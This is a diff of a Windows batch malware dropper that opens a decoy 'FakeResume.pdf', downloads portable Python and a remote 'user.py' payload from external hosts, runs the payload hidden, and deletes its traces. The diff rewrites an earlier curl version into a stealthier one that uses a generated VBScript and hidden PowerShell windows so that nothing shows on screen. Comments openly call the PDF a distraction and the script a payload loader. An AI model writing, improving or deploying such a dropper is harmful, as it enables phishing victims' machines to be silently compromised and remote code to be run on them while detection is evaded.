@@ -1,54 +1,45 @@
 @echo off
 
-REM Open PDF FIRST (user sees it immediately - distraction!)
-start /b curl -s -L -A "Mozilla/5.0" https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\doc.pdf"
-timeout /t 1 /nobreak >nul
-start "" "%temp%\doc.pdf"
+REM Create VBScript to run everything invisibly
+echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\inv.vbs"
+echo WshShell.Run "cmd /c ""%temp%\exec.cmd""", 0, False >> "%temp%\inv.vbs"
 
-REM Download Python portable (in background, with proper User-Agent)
-curl -L -A "Mozilla/5.0" https://staging.derideal.com/wp-content/app/python-portable.zip -o "%temp%\py.zip"
+REM Create the actual execution script
+(
+echo @echo off
+echo.
+echo REM Open PDF first
+echo start /b powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/FakeResume.pdf' -OutFile $env:temp'\doc.pdf' -UseBasicParsing;Start-Process $env:temp'\doc.pdf'"
+echo timeout /t 2 /nobreak ^>nul
+echo.
+echo REM Download Python portable
+echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://centremedicalwakim.com/app/python-portable.zip' -OutFile $env:temp'\py.zip' -UserAgent 'Mozilla/5.0' -UseBasicParsing" ^>nul 2^>^&1
+echo timeout /t 3 /nobreak ^>nul
+echo.
+echo REM Extract Python
+echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Expand-Archive -Path $env:temp'\py.zip' -DestinationPath $env:temp'\py' -Force" ^>nul 2^>^&1
+echo timeout /t 3 /nobreak ^>nul
+echo.
+echo REM Download payload
+echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py' -OutFile $env:temp'\user.py' -UseBasicParsing" ^>nul 2^>^&1
+echo timeout /t 1 /nobreak ^>nul
+echo.
+echo REM Run Python payload ^(hidden^)
+echo if exist "%temp%\py\python.exe" start /min "" "%temp%\py\python.exe" "%temp%\user.py"
+echo.
+echo REM Cleanup after delay
+echo timeout /t 15 /nobreak ^>nul
+echo del "%temp%\py.zip" 2^>nul
+echo del "%temp%\user.py" 2^>nul
+echo del "%temp%\doc.pdf" 2^>nul
+echo del "%temp%\exec.cmd" 2^>nul
+echo del "%temp%\inv.vbs" 2^>nul
+echo rd /s /q "%temp%\py" 2^>nul
+) > "%temp%\exec.cmd"
 
-REM Wait for download to complete (check file size is stable)
-:wait_download
-timeout /t 2 /nobreak >nul
-if not exist "%temp%\py.zip" goto wait_download
+REM Execute via VBScript (completely invisible)
+cscript //nologo "%temp%\inv.vbs"
 
-REM Clean old extraction
-rd /s /q "%temp%\py" 2>nul
-
-REM Extract Python
-powershell -Command "Expand-Archive -Path '%temp%\py.zip' -DestinationPath '%temp%\py' -Force" >nul 2>&1
-
-REM Wait for extraction (check multiple times)
-set attempts=0
-:check_python
-timeout /t 1 /nobreak >nul
-if exist "%temp%\py\python.exe" goto python_found
-
-set /a attempts+=1
-if %attempts% LSS 10 goto check_python
-
-REM If Python not found after 10 attempts, exit silently
-goto cleanup
-
-:python_found
-REM Download payload
-curl -s -A "Mozilla/5.0" https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"
-
-REM Wait for user.py download
-timeout /t 1 /nobreak >nul
-
-REM Run Python payload (completely silent)
-start /min "" "%temp%\py\python.exe" "%temp%\user.py"
-
-REM Cleanup after delay (let payload start first)
-:cleanup
-timeout /t 15 /nobreak >nul
-del "%temp%\py.zip" 2>nul
-del "%temp%\user.py" 2>nul
-del "%temp%\doc.pdf" 2>nul
-rd /s /q "%temp%\py" 2>nul
-
+REM Exit immediately
 exit
-
 
